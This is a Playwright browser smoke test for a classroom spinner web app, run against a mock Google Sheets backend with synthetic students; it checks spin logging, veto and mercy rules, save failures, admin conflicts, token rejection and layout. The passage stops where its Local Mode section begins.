/**
 * Browser smoke test for the critical classroom workflows.
 *
 * Runs the real frontend (Vite dev server) against the real backend code
 * (gas/Code.gs) on in-memory fake sheets with synthetic students. It never
 * contacts Google, the deployed Web App, or any real roster.
 *
 *   npm run test:e2e
 *
 * Environment:
 *   PW_CHROMIUM_PATH   optional path to a Chromium binary (otherwise Playwright's own)
 *   E2E_SCREENSHOTS=1  also write screenshots to e2e/artifacts/
 *   RINGWHEEL_GAS_PATH + E2E_LEGACY_BACKEND=1
 *                      run against an older copy of the backend source, to check the
 *                      frontend still works before the backend is redeployed. Steps that
 *                      need the current backend are skipped and reported as SKIP.
 */
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { existsSync, mkdirSync, readFileSync, readdirSync, rmSync, statSync } from 'node:fs';
import http from 'node:http';
import { extname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { chromium } from 'playwright';
import { createServer } from 'vite';
import { startMockServer } from './mock-server.mjs';

const ROOT = fileURLToPath(new URL('..', import.meta.url));
const ARTIFACTS = fileURLToPath(new URL('./artifacts/', import.meta.url));
const SCREENSHOTS = process.env.E2E_SCREENSHOTS === '1';
const LEGACY_BACKEND = process.env.E2E_LEGACY_BACKEND === '1';
/** What a successful save looks like. An older backend cannot confirm completeness. */
const SAVED = LEGACY_BACKEND ? 'unverified' : 'logged';
if (SCREENSHOTS) mkdirSync(ARTIFACTS, { recursive: true });

const REGIONS = ['Palearctic', 'Nearctic', 'Neotropical', 'Afrotropical', 'Indomalayan', 'Australasian', 'Antarctic', 'Oceanic'];
const TAXA = ['Mammalia', 'Aves', 'Reptilia', 'Amphibia', 'Actinopterygii', 'Chondrichthyes', 'Insecta', 'Arachnida', 'Plantae', 'Fungi'];
const IUCN = ['LC', 'NT', 'VU', 'EN', 'CR', 'EW', 'EX'];

const results = [];
let failures = 0;
let skipped = 0;

/** A step that only makes sense against the current backend source. */
async function currentBackendStep(name, fn) {
  if (LEGACY_BACKEND) {
    skipped++;
    results.push(`SKIP  ${name} (needs the current backend)`);
    return;
  }
  await step(name, fn);
}

async function step(name, fn) {
  try {
    await fn();
    results.push(`PASS  ${name}`);
  } catch (err) {
    failures++;
    results.push(`FAIL  ${name}\n      ${String(err && err.message ? err.message : err).split('\n').join('\n      ')}`);
  }
}

/**
 * Start the app. The old build-time connection variables are set on purpose,
 * to the local fake backend's address and token: the app must ignore them, so
 * a first-time visitor is never pointed at anybody's backend.
 */
async function startFrontend(env) {
  for (const key of ['VITE_SPIN_API_URL', 'VITE_RINGWHEEL_API_TOKEN', 'VITE_SPIN_API_TOKEN']) {
    process.env[key] = env[key] ?? '';
  }
  const server = await createServer({
    root: ROOT,
    logLevel: 'error',
    server: { host: '127.0.0.1', port: 0, strictPort: false },
  });
  await server.listen();
  const address = server.httpServer.address();
  return { server, url: `http://127.0.0.1:${address.port}` };
}

const shot = async (page, name) => {
  if (SCREENSHOTS) await page.screenshot({ path: `${ARTIFACTS}${name}.png`, fullPage: true });
};

const text = (page, testId) => page.getByTestId(testId).innerText();

/** Rows of the fake SpinsLog sheet as objects keyed by header. */
function logRows(mock) {
  const [headers, ...rows] = mock.runtime.rows('SpinsLog');
  return rows.map((row) => Object.fromEntries(headers.map((h, i) => [h, row[i]])));
}

/** Wait until the result panel shows a settled result and return what it says. */
async function readResult(page) {
  await page.getByTestId('result-ready').waitFor({ state: 'visible', timeout: 10000 });
  return {
    student: await text(page, 'result-student'),
    region: await text(page, 'result-region'),
    taxon: await text(page, 'result-taxon'),
    iucn: await text(page, 'result-iucn'),
  };
}

async function waitForLogStatus(page, status) {
  await page.locator(`section[aria-labelledby="result-heading"] [data-testid="log-status"][data-status="${status}"]`).waitFor({
    state: 'visible',
    timeout: 10000,
  });
}

async function spinOnce(page) {
  // The payload sits inside a closed <details>, so read its text content rather than what is visible.
  const before = (await page.getByTestId('debug-payload').count()) ? await page.getByTestId('debug-payload').textContent() : '';
  await page.getByTestId('spin-button').click();
  await page.waitForFunction(
    (previous) => {
      const ready = document.querySelector('[data-testid="result-ready"]');
      const debug = document.querySelector('[data-testid="debug-payload"]');
      return ready && debug && debug.textContent !== previous;
    },
    before,
    { timeout: 10000 }
  );
  return readResult(page);
}

/**
 * Independent check that the wheel visually agrees with the result: the label
 * that won on each ring must sit at the top centre, under the pointer.
 */
async function assertWheelPointsAt(page, expected) {
  await page.waitForTimeout(600); // let the (reduced motion) transition finish
  const geometry = await page.evaluate((labels) => {
    const svg = document.querySelector('[data-testid="ring-wheel"]');
    const box = svg.getBoundingClientRect();
    const out = {};
    for (const [ring, label] of Object.entries(labels)) {
      const texts = [...svg.querySelectorAll(`[data-ring="${ring}"] text`)];
      const node = texts.find((t) => t.textContent === label);
      if (!node) {
        out[ring] = null;
        continue;
      }
      const r = node.getBoundingClientRect();
      out[ring] = {
        dx: (r.left + r.width / 2 - (box.left + box.width / 2)) / box.width,
        dy: (r.top + r.height / 2 - (box.top + box.height / 2)) / box.height,
      };
    }
    return out;
  }, expected);
  for (const [ring, label] of Object.entries(expected)) {
    const g = geometry[ring];
    assert.ok(g, `wheel has no "${label}" slice on the ${ring} ring`);
    assert.ok(Math.abs(g.dx) < 0.02, `${ring} "${label}" is not horizontally under the pointer (offset ${g.dx.toFixed(3)})`);
    assert.ok(g.dy < -0.05, `${ring} "${label}" is not in the top half of the wheel (offset ${g.dy.toFixed(3)})`);
  }
}

const browser = await chromium.launch(
  process.env.PW_CHROMIUM_PATH ? { executablePath: process.env.PW_CHROMIUM_PATH } : {}
);

// ===========================================================================
// Part A: Connected Mode (the teacher's own Google Sheet backend)
// ===========================================================================
const mock = await startMockServer();
const app = await startFrontend({ VITE_SPIN_API_URL: mock.url, VITE_RINGWHEEL_API_TOKEN: mock.token });
const { spin: engineSpin } = await app.server.ssrLoadModule('/src/utils/spin-engine.ts');

const context = await browser.newContext({
  viewport: { width: 1440, height: 900 },
  reducedMotion: 'reduce',
  deviceScaleFactor: SCREENSHOTS ? 2 : 1,
});
const page = await context.newPage();
const pageErrors = [];
page.on('pageerror', (err) => pageErrors.push(err.message));

await step('a first-time visitor is in Local Mode and the backend is never contacted, even with the old build variables set', async () => {
  assert.equal(process.env.VITE_SPIN_API_URL, mock.url);
  assert.equal(process.env.VITE_RINGWHEEL_API_TOKEN, mock.token);
  await page.goto(`${app.url}/spin`);
  await page.locator('[data-testid="storage-badge"][data-mode="local"]').waitFor({ timeout: 10000 });
  await page.locator('[data-testid="api-status"][data-status="ok"][data-mode="local"]').waitFor();
  await page.goto(`${app.url}/admin`);
  await page.locator('[data-testid="save-settings"]:not([disabled])').waitFor();
  assert.match(await text(page, 'storage-authority'), /Local Mode is on/);
  assert.match(await text(page, 'token-source'), /No API token is saved/);
  assert.equal(await page.getByLabel('Backend URL').inputValue(), '');
  await page.waitForTimeout(300);
  assert.equal(mock.state.requests.length, 0, 'the backend was contacted without being configured');
});

await step('Connected Mode turns on only when the teacher enters a complete connection', async () => {
  // A half-entered connection does not switch modes.
  await page.getByLabel('Backend URL').fill(mock.url);
  await page.getByTestId('save-connection').click();
  assert.match(await text(page, 'admin-notice'), /Connected Mode was not turned on\. The API token is not set\./);
  assert.equal(await page.locator('[data-testid="storage-badge"][data-mode="local"]').count(), 1);
  assert.equal(mock.state.requests.length, 0);

  await page.getByLabel('API token', { exact: true }).fill(mock.token);
  await page.getByTestId('save-connection').click();
  await page.locator('[data-testid="storage-badge"][data-mode="connected"]').waitFor({ timeout: 10000 });
  await page.locator('[data-testid="api-status"][data-status="ok"][data-mode="connected"]').waitFor({ timeout: 10000 });
  assert.match(await text(page, 'storage-authority'), /Connected Mode is on/);
  assert.match(await text(page, 'token-source'), /An API token is saved in this browser/);
  // The token is in this browser's storage and nowhere in the page address.
  assert.ok(!page.url().includes(mock.token));
});

await step('spin page loads, backend reports connected, no result is shown before a spin', async () => {
  await page.goto(`${app.url}/spin`);
  await page.locator('[data-testid="api-status"][data-status="ok"][data-mode="connected"]').waitFor({ timeout: 10000 });
  assert.equal(await page.getByTestId('api-not-configured').count(), 0);
  assert.match(await text(page, 'storage-badge'), /Connected Mode\. Data is read from and saved to your Google Sheet/);
  await page.getByTestId('ring-wheel').waitFor();
  assert.match(await text(page, 'result-empty'), /No spin yet/);
  if (LEGACY_BACKEND) {
    assert.match(await page.getByTestId('api-note').first().innerText(), /Older backend version/);
  } else {
    assert.equal(await page.getByTestId('api-note').count(), 0);
  }
  await shot(page, '01-spin-initial');
});

await step('roster loads for the selected period only, and offers the periods found in the roster', async () => {
  await page.getByRole('button', { name: 'Load Roster' }).click();
  await page.getByTestId('queue').waitFor();
  assert.match(await text(page, 'queue-status'), /Loaded 3 students for S1 period A/);
  const names = await page.getByTestId('queue').locator('li > span:first-child').allInnerTexts();
  assert.deepEqual(names, ['Ada Sample', 'Ben Placeholder', 'Cy Demo']);
  const options = await page.getByTestId('period-select').locator('option').allInnerTexts();
  assert.deepEqual(options, ['A', 'B']);
});

let first;
await step('a spin picks a legal result, shows the student, and is confirmed as saved', async () => {
  await page.getByRole('button', { name: 'Next Spinner' }).click();
  assert.match(await text(page, 'current-student'), /Ada Sample/);
  first = await spinOnce(page);
  assert.equal(first.student, 'Ada Sample');
  assert.ok(REGIONS.includes(first.region), `unexpected region ${first.region}`);
  assert.ok(TAXA.includes(first.taxon) && first.taxon !== 'Plantae', `unexpected taxon ${first.taxon}`);
  assert.ok(IUCN.includes(first.iucn), `unexpected IUCN ${first.iucn}`);
  await waitForLogStatus(page, SAVED);
  await shot(page, '02-after-spin');
});

await step('the logged row matches what was shown, with student, period, session and real-spin markers', async () => {
  const rows = logRows(mock);
  assert.equal(rows.length, 1);
  const row = rows[0];
  assert.equal(row.student_name, 'Ada Sample');
  assert.equal(row.email, 'ada.sample@example.com');
  assert.equal(row.period, 'A');
  assert.equal(row.result_A, first.region);
  assert.equal(row.result_B, first.taxon);
  assert.equal(row.result_C, first.iucn);
  assert.equal(row.is_test, false);
  assert.equal(row.veto_used, false);
  assert.equal(row.plantae_mercy, false);
  assert.match(String(row.session_id), /^[0-9a-f]{16}$/);
  assert.match(String(row.seed), /^[0-9a-f]{16}$/);
  assert.deepEqual(JSON.parse(row.rule_flags_json), []);
});

await step('the logged seed reproduces the logged result', async () => {
  const row = logRows(mock)[0];
  const replay = engineSpin({ seed: row.seed });
  assert.equal(replay.region, row.result_A);
  assert.equal(replay.taxon, row.result_B);
  assert.equal(replay.iucn, row.result_C);
});

await step('the wheel stops with the winning slices under the pointer', async () => {
  await assertWheelPointsAt(page, { region: first.region, taxon: first.taxon, iucn: first.iucn });
});

let afterVeto;
await step('veto re-spins only the chosen ring and logs it as a veto', async () => {
  await page.getByRole('radio', { name: 'Taxon' }).check();
  assert.match(await text(page, 'spin-button'), /Veto: re-spin Taxon/i);
  const before = await page.getByTestId('debug-payload').textContent();
  await page.getByTestId('veto-button').click();
  await page.waitForFunction((prev) => document.querySelector('[data-testid="debug-payload"]')?.textContent !== prev, before);
  afterVeto = await readResult(page);
  assert.equal(afterVeto.region, first.region, 'region changed during a taxon veto');
  assert.equal(afterVeto.iucn, first.iucn, 'IUCN changed during a taxon veto');
  assert.notEqual(afterVeto.taxon, first.taxon, 'taxon did not change');
  assert.notEqual(afterVeto.taxon, 'Plantae');
  await waitForLogStatus(page, SAVED);
  const row = logRows(mock)[1];
  assert.equal(row.veto_used, true);
  assert.equal(row.student_name, 'Ada Sample');
  assert.deepEqual(JSON.parse(row.rule_flags_json), ['veto_respin', 'veto_respin_taxon']);
  await assertWheelPointsAt(page, { region: afterVeto.region, taxon: afterVeto.taxon, iucn: afterVeto.iucn });
});

await step('veto without a chosen ring does nothing but explain', async () => {
  const count = logRows(mock).length;
  await page.getByTestId('veto-button').click();
  assert.match(await text(page, 'veto-warning'), /Select Region, Taxon, or IUCN/);
  assert.equal(logRows(mock).length, count);
});

await step('Plantae Mercy sets Plantae with the chosen region, keeps IUCN, and is flagged', async () => {
  await page.getByTestId('mercy-button').click();
  const dialog = page.getByRole('dialog', { name: 'Plantae Mercy' });
  await dialog.waitFor();
  await dialog.getByRole('button', { name: 'Neotropical' }).click();
  const mercy = await readResult(page);
  assert.equal(mercy.taxon, 'Plantae');
  assert.equal(mercy.region, 'Neotropical');
  assert.equal(mercy.iucn, afterVeto.iucn);
  await waitForLogStatus(page, SAVED);
  const row = logRows(mock)[2];
  assert.equal(row.plantae_mercy, true);
  assert.equal(row.veto_used, false);
  assert.equal(row.result_B, 'Plantae');
  assert.deepEqual(JSON.parse(row.rule_flags_json), ['plantae_mercy', 'wildcard_iucn']);
  await assertWheelPointsAt(page, { region: mercy.region, taxon: mercy.taxon, iucn: mercy.iucn });
  await shot(page, '03-plantae-mercy');
});

await step('a failed log write is shown as NOT SAVED, never as success, and can be retried', async () => {
  const count = logRows(mock).length;
  mock.state.failLogSpin = true;
  await page.getByRole('button', { name: 'Next Spinner' }).click();
  assert.match(await text(page, 'current-student'), /Ben Placeholder/);
  const result = await spinOnce(page);
  await waitForLogStatus(page, 'failed');
  const panel = page.locator('section[aria-labelledby="result-heading"]');
  assert.match(await panel.innerText(), /NOT SAVED to the log/);
  assert.equal(await panel.getByRole('alert').count(), 1);
  assert.match(await text(page, 'unsaved-count'), /1 not saved/);
  assert.equal(logRows(mock).length, count, 'a row was written even though the write failed');
  await shot(page, '04-log-failed');

  mock.state.failLogSpin = false;
  await panel.getByRole('button', { name: 'Retry saving' }).click();
  await waitForLogStatus(page, SAVED);
  const rows = logRows(mock);
  assert.equal(rows.length, count + 1);
  assert.equal(rows[rows.length - 1].student_name, 'Ben Placeholder');
  assert.equal(rows[rows.length - 1].result_A, result.region);
  assert.equal(await page.getByTestId('unsaved-count').count(), 0);
});

await step('the queue advances after each student and reports when everyone has spun', async () => {
  await page.getByRole('button', { name: 'Next Spinner' }).click();
  assert.match(await text(page, 'current-student'), /Cy Demo/);
  await spinOnce(page);
  await waitForLogStatus(page, SAVED);
  await page.getByRole('button', { name: 'Next Spinner' }).click();
  assert.match(await text(page, 'queue-status'), /All students in this queue have spun/);
});

await step("today's saved log lists the real spins", async () => {
  await page.getByRole('button', { name: 'Refresh' }).click();
  await page.getByTestId('logged-spins').waitFor();
  const rowCount = await page.getByTestId('logged-spins').locator('tbody tr').count();
  assert.equal(rowCount, logRows(mock).length);
});

await step('the spin button works from the keyboard', async () => {
  const before = await page.getByTestId('debug-payload').textContent();
  await page.getByTestId('spin-button').focus();
  await page.keyboard.press('Enter');
  await page.waitForFunction((prev) => document.querySelector('[data-testid="debug-payload"]')?.textContent !== prev, before);
  await readResult(page);
});

/**
 * Replace the fake SpinsLog tab with a copy that lacks some columns, the way a
 * hand-edited Sheet might. Returns a function that puts the full tab back and
 * keeps any rows written in the meantime.
 */
function dropSpinsLogColumns(columns) {
  const sheet = mock.runtime.sheet('SpinsLog');
  const original = sheet.rows.map((r) => [...r]);
  const fullHeaders = original[0];
  const keep = fullHeaders.map((h, i) => (columns.includes(h) ? -1 : i)).filter((i) => i >= 0);
  sheet.rows = original.map((r) => keep.map((i) => r[i]));
  return () => {
    const reducedHeaders = sheet.rows[0];
    const added = sheet.rows.slice(original.length).map((r) => fullHeaders.map((h) => {
      const at = reducedHeaders.indexOf(h);
      return at === -1 ? '' : r[at];
    }));
    sheet.rows = [...original, ...added];
    return added;
  };
}

await currentBackendStep('a spin into a log sheet missing optional columns is shown as INCOMPLETE, never as saved', async () => {
  const restore = dropSpinsLogColumns(['seed', 'session_id']);
  try {
    // The health check warns before any spin is made.
    const probe = await context.newPage();
    await probe.goto(`${app.url}/spin`);
    await probe.locator('[data-testid="api-status"][data-status="ok"]').waitFor({ timeout: 10000 });
    assert.match(await probe.getByTestId('api-note').innerText(), /SpinsLog has no column for: session_id, seed/);
    await probe.close();

    const result = await spinOnce(page);
    await waitForLogStatus(page, 'partial');
    const panel = page.locator('section[aria-labelledby="result-heading"]');
    const panelText = await panel.innerText();
    assert.match(panelText, /Saved INCOMPLETE/);
    assert.doesNotMatch(panelText, /Saved to the log/);
    assert.match(await text(page, 'log-partial'), /Not stored: session_id, seed\./);
    assert.equal(await panel.getByRole('alert').count(), 1);
    assert.match(await text(page, 'incomplete-count'), /1 incomplete/);
    assert.equal(await page.getByTestId('unsaved-count').count(), 0);
    await shot(page, '04b-log-incomplete');

    // The row exists and holds everything the sheet had a column for.
    const [headers, ...rows] = mock.runtime.rows('SpinsLog');
    assert.ok(!headers.includes('seed') && !headers.includes('session_id'));
    const last = rows[rows.length - 1];
    assert.equal(last.length, headers.length);
    assert.equal(last[headers.indexOf('result_A')], result.region);
    assert.equal(last[headers.indexOf('is_test')], false);
  } finally {
    restore();
  }
});

await currentBackendStep('a spin into a log sheet missing a required column is NOT SAVED and writes no partial row', async () => {
  const restore = dropSpinsLogColumns(['email']);
  const before = mock.runtime.rows('SpinsLog').length;
  let restored = false;
  try {
    // The health check fails before any spin is made.
    const probe = await context.newPage();
    await probe.goto(`${app.url}/spin`);
    await probe.locator('[data-testid="api-status"][data-status="error"]').waitFor({ timeout: 10000 });
    assert.match(await probe.getByTestId('api-status').innerText(), /SpinsLog is missing required columns: email/);
    await probe.close();

    const result = await spinOnce(page);
    await waitForLogStatus(page, 'failed');
    const panel = page.locator('section[aria-labelledby="result-heading"]');
    assert.match(await panel.innerText(), /NOT SAVED to the log/);
    assert.match(await text(page, 'log-error'), /Nothing was logged\. The SpinsLog sheet is missing required columns: email\./);
    assert.equal(mock.runtime.rows('SpinsLog').length, before, 'a partial row was written');

    // Once the column is back, the same spin can be saved in full.
    restore();
    restored = true;
    await panel.getByRole('button', { name: 'Retry saving' }).click();
    await waitForLogStatus(page, 'logged');
    const rows = logRows(mock);
    assert.equal(rows[rows.length - 1].result_A, result.region);
    assert.match(String(rows[rows.length - 1].seed), /^[0-9a-f]{16}$/);
  } finally {
    if (!restored) restore();
  }
});

await step('the auto test harness passes and writes nothing to the sheet by default', async () => {
  const count = logRows(mock).length;
  const panel = page.getByTestId('auto-test-panel');
  await panel.getByLabel('Spins per mode').fill('25');
  await panel.getByRole('button', { name: 'Run auto test' }).click();
  await page.getByTestId('auto-test-summary').waitFor({ timeout: 20000 });
  const statuses = await page.getByTestId('auto-test-summary').locator('tbody tr td:last-child').allInnerTexts();
  assert.deepEqual(statuses, ['OK', 'OK', 'OK', 'OK', 'OK']);
  assert.equal(await page.getByTestId('auto-test-errors').count(), 0);
  await page.getByTestId('auto-test-metrics').waitFor();
  assert.equal(logRows(mock).length, count, 'test spins were written to the sheet without being asked');
});

await step('test rows written on request are marked as tests and kept out of the classroom log view', async () => {
  const before = logRows(mock).length;
  const table = page.getByTestId('logged-spins');
  const shownBefore = await table.locator('tbody tr').count();
  const panel = page.getByTestId('auto-test-panel');
  await panel.getByLabel('Spins per mode').fill('1');
  await panel.getByLabel(/Also write test rows/).check();
  await panel.getByRole('button', { name: 'Run auto test' }).click();
  await page.getByTestId('auto-test-summary').waitFor({ timeout: 20000 });
  const added = logRows(mock).slice(before);
  assert.equal(added.length, 5);
  for (const row of added) {
    assert.equal(row.is_test, true);
    assert.equal(row.student_name, '');
    assert.ok(JSON.parse(row.rule_flags_json).includes('auto_test_run'));
  }
  // The classroom log view must not show them as student spins.
  await page.getByRole('button', { name: 'Refresh' }).click();
  await page.waitForTimeout(500);
  assert.equal(await table.locator('tbody tr').count(), shownBefore);
  assert.equal(await table.getByText('auto_test_run').count(), 0);
});

await step('every control has an accessible name', async () => {
  const unnamed = await page.evaluate(() => {
    const problems = [];
    for (const el of document.querySelectorAll('button, a[href]')) {
      if (!(el.textContent || '').trim() && !el.getAttribute('aria-label')) problems.push(el.outerHTML.slice(0, 80));
    }
    for (const el of document.querySelectorAll('input, select, textarea')) {
      const labelled = el.closest('label') || el.getAttribute('aria-label') || (el.id && document.querySelector(`label[for="${el.id}"]`));
      if (!labelled) problems.push(el.outerHTML.slice(0, 80));
    }
    return problems;
  });
  assert.deepEqual(unnamed, []);
});

await step('layout has no sideways scrolling on projector, laptop, tablet and phone sizes', async () => {
  for (const [name, width, height] of [
    ['projector-1920', 1920, 1080],
    ['laptop-1366', 1366, 768],
    ['tablet-1024', 1024, 768],
    ['phone-390', 390, 844],
  ]) {
    await page.setViewportSize({ width, height });
    await page.waitForTimeout(150);
    const overflow = await page.evaluate(() => document.documentElement.scrollWidth - window.innerWidth);
    assert.ok(overflow <= 1, `${name}: page is ${overflow}px wider than the screen`);
    const wheel = await page.getByTestId('ring-wheel').boundingBox();
    assert.ok(wheel && wheel.width >= Math.min(300, width - 40), `${name}: wheel is only ${wheel?.width}px wide`);
    await shot(page, `05-${name}`);
  }
  await page.setViewportSize({ width: 1440, height: 900 });
});

await step('an unknown address goes to the spinner instead of a blank page', async () => {
  await page.goto(`${app.url}/no-such-page`);
  await page.getByTestId('ring-wheel').waitFor();
  assert.match(page.url(), /\/spin$/);
});

// --- Admin -----------------------------------------------------------------

await step('saving settings keeps unrelated rows, notes and the documented pair cap key', async () => {
  await page.goto(`${app.url}/admin`);
  await page.locator('[data-testid="save-settings"]:not([disabled])').waitFor({ timeout: 10000 });
  await page.getByLabel(/Pair cap/).fill('20');
  await page.getByTestId('save-settings').click();
  await page.getByText('Settings saved to the sheet.').waitFor();
  const [headers, ...rows] = mock.runtime.rows('Settings');
  assert.deepEqual(headers, ['key', 'value', 'notes']);
  const byKey = Object.fromEntries(rows.map((r) => [r[0], r]));
  assert.equal(String(byKey.midterm_pair_cap_pct[1]), '20');
  assert.equal(byKey.midterm_pair_cap_pct[2], 'Cap for A|B pairs in midterm mode');
  assert.deepEqual(byKey.mode, ['mode', 'midterm', 'midterm or final']);
  assert.equal(String(byKey.enableAudio[1]), 'false');
  assert.equal(byKey.enableAudio[2], 'Sheets stores this as a real boolean');
  // The value is stored, but the page says it is not in use: spins keep the historical 12%.
  assert.match(await text(page, 'pair-cap-inactive'), /Not in use\. Spins use the fixed 12% cap/);
  assert.equal(byKey.usePairCapSetting, undefined);
  await shot(page, '06-admin');
});

await step('saving weights changes only the weight column and loses no rows', async () => {
  const before = mock.runtime.rows('Rings');
  await page.getByText('not used', { exact: false }).waitFor();
  await page.getByLabel('Nearctic').fill('3');
  await page.getByTestId('save-weights').click();
  await page.getByText('Weights saved to the sheet.').waitFor();
  const after = mock.runtime.rows('Rings');
  assert.equal(after.length, before.length);
  for (let i = 0; i < before.length; i++) {
    const expected = [...before[i]];
    if (expected[1] === 'Nearctic') expected[3] = 3;
    assert.deepEqual(after[i], expected);
  }
});

await step('an admin save is refused, with nothing lost, when the Sheet changed after the page loaded', async () => {
  await page.goto(`${app.url}/admin`);
  await page.locator('[data-testid="save-settings"]:not([disabled])').waitFor({ timeout: 10000 });

  // Meanwhile a colleague adds a row and edits a value directly in the Sheet.
  const sheet = mock.runtime.sheet('Settings');
  sheet.rows.push(['added_in_sheets', 'yes', 'by a colleague']);
  const modeRow = sheet.rows.find((r) => r[0] === 'mode');
  modeRow[1] = 'final';
  const afterEdit = JSON.stringify(mock.runtime.rows('Settings'));
  const writesBefore = mock.state.requests.filter((r) => r.type === 'writesettings').length;

  await page.getByLabel('Confetti', { exact: true }).check();
  await page.getByTestId('save-settings').click();
  const notice = page.getByTestId('admin-notice');
  await notice.getByText(/Settings were NOT saved/).waitFor();
  assert.match(await notice.innerText(), /changed by someone else after this page loaded it \(changed: mode; added: added_in_sheets\)/);
  assert.equal(JSON.stringify(mock.runtime.rows('Settings')), afterEdit, 'the sheet was modified by a refused save');
  assert.equal(mock.state.requests.filter((r) => r.type === 'writesettings').length, writesBefore, 'a write was sent');
  await shot(page, '06b-admin-conflict');

  // Reload, redo the edit: now both people's changes are in the sheet.
  await page.getByTestId('reload-after-conflict').click();
  await page.locator('[data-testid="save-settings"]:not([disabled])').waitFor();
  assert.equal(await page.getByTestId('admin-notice').count(), 0);
  await page.getByLabel('Confetti', { exact: true }).check();
  await page.getByTestId('save-settings').click();
  await page.getByText('Settings saved to the sheet.').waitFor();
  const rows = mock.runtime.rows('Settings');
  assert.deepEqual(rows.find((r) => r[0] === 'added_in_sheets'), ['added_in_sheets', 'yes', 'by a colleague']);
  assert.deepEqual(rows.find((r) => r[0] === 'mode'), ['mode', 'final', 'midterm or final']);
  assert.equal(String(rows.find((r) => r[0] === 'enableConfetti')[1]), 'true');

  // Put the synthetic sheet back the way the following steps expect it.
  await page.getByLabel('Confetti', { exact: true }).uncheck();
  await page.getByTestId('save-settings').click();
  await page.getByText('Settings saved to the sheet.').waitFor();
});

await step('a weight that would leave a ring with nothing to land on is refused', async () => {
  const before = JSON.stringify(mock.runtime.rows('Rings'));
  for (const label of IUCN) await page.getByLabel(label, { exact: true }).fill('0');
  await page.getByTestId('save-weights').click();
  assert.match(await text(page, 'admin-notice'), /Not saved.*iucn ring would have no option/i);
  assert.equal(JSON.stringify(mock.runtime.rows('Rings')), before);
  for (const label of IUCN) await page.getByLabel(label, { exact: true }).fill('1');
});

await step('weights only affect spins once "Apply ring weights" is on, and the spin page then says so', async () => {
  // Weights saved, switch still off: the spin page must not be weighted.
  await page.goto(`${app.url}/spin`);
  await page.locator('[data-testid="api-status"][data-status="ok"]').waitFor();
  await page.waitForTimeout(400);
  assert.equal(await page.getByTestId('weighted-notice').count(), 0);

  await page.goto(`${app.url}/admin`);
  await page.locator('[data-testid="save-settings"]:not([disabled])').waitFor();
  for (const label of REGIONS) await page.getByLabel(label, { exact: true }).fill(label === 'Oceanic' ? '1' : '0');
  // Four taxa stay in play, which the next step uses to run the pair cap dry.
  const weightsSection = page.locator('section[aria-labelledby="weights-heading"]');
  for (const label of TAXA) await weightsSection.getByLabel(label).fill(TAXA.indexOf(label) < 4 ? '1' : '0');
  await page.getByTestId('save-weights').click();
  await page.getByText('Weights saved to the sheet.').waitFor();
  await page.getByLabel(/Apply ring weights to spins/).check();
  await page.getByTestId('save-settings').click();
  await page.getByText('Settings saved to the sheet.').waitFor();

  await page.goto(`${app.url}/spin`);
  await page.getByTestId('weighted-notice').waitFor({ timeout: 10000 });
  const one = await spinOnce(page);
  assert.equal(one.region, 'Oceanic');
  const two = await spinOnce(page);
  assert.equal(two.region, 'Oceanic');
  assert.notEqual(`${two.region}:${two.taxon}`, `${one.region}:${one.taxon}`, 'pair cap allowed an immediate repeat');
  await shot(page, '07-weighted');
});

/** Spin until the pair cap runs dry and return the message shown. Fails if a spin is logged without being made. */
async function spinUntilExhausted() {
  for (let i = 0; i < 12; i++) {
    const before = logRows(mock).length;
    await page.getByTestId('spin-button').click();
    await page.waitForTimeout(700);
    if (await page.getByTestId('spin-error').count()) {
      assert.equal(logRows(mock).length, before, 'a spin was logged although none was made');
      return text(page, 'spin-error');
    }
  }
  assert.fail('the pair cap never ran out, so the exhausted state was not exercised');
}

await step('when the rules leave no legal outcome the page says so and logs nothing', async () => {
  // One region and four taxa: after 4 spins every pair sits at 25% and is capped.
  const message = await spinUntilExhausted();
  assert.match(message, /No spin was made.*pair cap leaves no Region and Taxon combination/s);
  await shot(page, '08-exhausted');
});

await step('the pair cap stays at the historical 12% until the teacher turns the sheet value on', async () => {
  // The Settings sheet says 20 (saved earlier), but the switch is off.
  assert.equal(String(mock.runtime.rows('Settings').find((r) => r[0] === 'midterm_pair_cap_pct')[1]), '20');
  assert.match(await text(page, 'spin-error'), /The 12% pair cap/);

  await page.goto(`${app.url}/admin`);
  await page.locator('[data-testid="save-settings"]:not([disabled])').waitFor();
  await page.getByRole('checkbox', { name: /^Use the pair cap value below/ }).check();
  await page.getByTestId('save-settings').click();
  await page.getByText('Settings saved to the sheet.').waitFor();
  assert.equal(await page.getByTestId('pair-cap-inactive').count(), 0);
  assert.equal(String(mock.runtime.rows('Settings').find((r) => r[0] === 'usePairCapSetting')[1]), 'true');

  await page.goto(`${app.url}/spin`);
  await page.getByTestId('weighted-notice').waitFor({ timeout: 10000 });
  assert.match(await spinUntilExhausted(), /The 20% pair cap/);
});

await step('a rejected token is reported plainly and blocks admin saves', async () => {
  await page.evaluate(() => localStorage.setItem('ringwheel.apiToken', 'wrong-token'));
  await page.goto(`${app.url}/admin`);
  await page.getByTestId('admin-load-error').waitFor({ timeout: 10000 });
  assert.match(await text(page, 'admin-load-error'), /rejected the token/);
  assert.ok(await page.getByTestId('save-settings').isDisabled());
  assert.ok(await page.getByTestId('save-weights').isDisabled());
  await page.goto(`${app.url}/spin`);
  await page.locator('[data-testid="api-status"][data-status="error"]').waitFor({ timeout: 10000 });
  await page.getByTestId('config-error').waitFor();
  await shot(page, '09-forbidden');
  await page.evaluate(() => localStorage.clear());
});

await step('no uncaught page errors during the configured run', async () => {
  assert.deepEqual(pageErrors, []);
});

await step('the backend never received a request that needs CORS preflight', async () => {
  // The mock refuses OPTIONS like Apps Script does, so any preflighted call would have failed above.
  const types = new Set(mock.state.requests.map((r) => `${r.method} ${r.type}`));
  for (const expected of ['GET health', 'GET roster', 'GET rings', 'GET settings', 'POST logspin', 'POST getspins', 'POST writesettings', 'POST writerings']) {
    assert.ok(types.has(expected), `expected a ${expected} request`);
  }
  assert.equal(mock.runtime.sentEmails.length, 0);
});

const connectedRequests = mock.state.requests.length;
const connectedLogRows = mock.runtime.rows('SpinsLog').length;
await context.close();

// ===========================================================================
// Part B: Local Mode (the default: no account, no backend, no token)
// ===========================================================================
const local = await browser.newContext({
  viewport: { width: 1440, height: 900 },
  reducedMotion: 'reduce',
  deviceScaleFactor: SCREENSHOTS ? 2 : 1,
  acceptDownloads: true,
});
/** Every request the Local Mode browser makes, to prove none leaves the app's own address. */
const localRequests = [];
local.on('request', (req) => localRequests.push(req.url()));
const lp = await local.newPage();
const localErrors = [];
lp.on('pageerror', (err) => localErrors.push(err.message));
/** A second tab in the same browser profile: same origin, same real IndexedDB database. */
